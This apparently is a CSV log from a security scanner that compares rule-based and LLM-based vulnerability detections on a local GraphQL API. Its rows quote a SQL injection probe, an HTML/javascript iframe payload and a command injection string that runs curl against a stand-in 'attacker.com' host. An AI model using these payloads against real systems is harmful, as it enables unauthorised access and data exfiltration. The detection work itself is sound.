timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-05T02:13:12.418975,episode_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL error reveals a SQL injection attempt in the `id` parameter of the `/api/episode` endpoint. The payload `1' UNION SELECT NULL,@@version--` is a classic SQLi probe to extract database version information. While the direct error message relates to type casting (\""Cast to Number failed\""), this is likely a side effect of the malformed input caused by the SQL payload. The presence of `@@version` (a database-specific function) and SQL syntax in the URL strongly indicates improper input sanitization, exposing the backend to SQL injection."", ""evidence"": ""URL parameter contains '1%27%20UNION%20SELECT%20NULL,@@version--', which decodes to SQL payload '1' UNION SELECT NULL,@@version--'"", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""HIGH"", ""confidence"": 0.8, ""evidence"": ""URL parameter contains '1%27%20UNION%20SELECT%20NULL,@@version--', which decodes to SQL payload '1' UNION SELECT NULL,@@version--'"", ""explanation"": ""The GraphQL error reveals a SQL injection attempt in the `id` parameter of the `/api/episode` endpoint. The payload `1' UNION SELECT NULL,@@version--` is a classic SQLi probe to extract database version information. While the direct error message relates to type casting (\""Cast to Number failed\""), this is likely a side effect of the malformed input caused by the SQL payload. The presence of `@@version` (a database-specific function) and SQL syntax in the URL strongly indicates improper input sanitization, exposing the backend to SQL injection.""}}]"
2025-10-05T02:13:17.013190,episode_response_3,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T02:13:34.953926,episode_response_4,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T02:13:47.985057,episode_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The error response reveals a malformed input containing a command injection attempt using ; to terminate the ID parameter and execute curl${IFS}attacker.com. The ${IFS} syntax is a common shell variable substitution to bypass space detection. While the immediate error shows a cast failure, the payload structure indicates backend systems processed unsanitized user input in a command execution context. The 500 error suggests the payload caused unexpected behavior at the system level, strongly indicating improper input sanitization for OS command execution."", ""evidence"": ""Attempted command injection payload '1;curl${IFS}attacker.com' in URL parameter triggering cast error"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""Attempted command injection payload '1;curl${IFS}attacker.com' in URL parameter triggering cast error"", ""explanation"": ""The error response reveals a malformed input containing a command injection attempt using ; to terminate the ID parameter and execute curl${IFS}attacker.com. The ${IFS} syntax is a common shell variable substitution to bypass space detection. While the immediate error shows a cast failure, the payload structure indicates backend systems processed unsanitized user input in a command execution context. The 500 error suggests the payload caused unexpected behavior at the system level, strongly indicating improper input sanitization for OS command execution.""}}]"
2025-10-05T02:13:54.468058,episode_response_6,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T02:14:45.680650,episode_response_7,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,[],"[{""detection_name"": ""LLM: html_injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The server's error response includes a URL containing an encoded HTML iframe payload (<iframe src='javascript:alert(1)'>) in its error metadata. This indicates the server processed unsanitized user input containing HTML/script content. If this URL is ever reflected in a client-facing context without proper encoding (e.g., in error messages or logs), it could lead to HTML injection or XSS when decoded and rendered. The 500 error suggests the payload disrupted normal processing, but the key risk lies in the server's acceptance and reflection of raw HTML in URLs."", ""evidence"": ""URL contains HTML payload: 'http://localhost:8080/api/episode/%3Ciframe%20src=%27javascript:alert(1)%27%3E' (decoded as <iframe src='javascript:alert(1)'>)"", ""confidence"": 0.7, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.7, ""evidence"": ""URL contains HTML payload: 'http://localhost:8080/api/episode/%3Ciframe%20src=%27javascript:alert(1)%27%3E' (decoded as <iframe src='javascript:alert(1)'>)"", ""explanation"": ""The server's error response includes a URL containing an encoded HTML iframe payload (<iframe src='javascript:alert(1)'>) in its error metadata. This indicates the server processed unsanitized user input containing HTML/script content. If this URL is ever reflected in a client-facing context without proper encoding (e.g., in error messages or logs), it could lead to HTML injection or XSS when decoded and rendered. The 500 error suggests the payload disrupted normal processing, but the key risk lies in the server's acceptance and reflection of raw HTML in URLs.""}}]"
2025-10-05T02:14:54.996792,episode_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T02:15:19.833747,episode_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T02:15:26.608056,episode_response_10,413,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T02:15:35.263088,episode_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,0,1,0.0,no_potential,,,,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""safe"", ""category"": ""Unknown"", ""description"": ""The GraphQL response exposes field suggestions in validation errors, revealing valid schema fields ('id', 'name', 'characters'). While not directly exploitable, this information disclosure helps attackers probe the schema and refine malicious queries. Production systems should disable field suggestions to reduce reconnaissance opportunities."", ""evidence"": ""Server returned field suggestions (e.g., \""Did you mean 'id'?\"", \""Did you mean 'name'?\"", \""Did you mean 'characters'?\"") in validation errors"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""LOW"", ""confidence"": 0.9, ""evidence"": ""Server returned field suggestions (e.g., \""Did you mean 'id'?\"", \""Did you mean 'name'?\"", \""Did you mean 'characters'?\"") in validation errors"", ""explanation"": ""The GraphQL response exposes field suggestions in validation errors, revealing valid schema fields ('id', 'name', 'characters'). While not directly exploitable, this information disclosure helps attackers probe the schema and refine malicious queries. Production systems should disable field suggestions to reduce reconnaissance opportunities.""}}]"
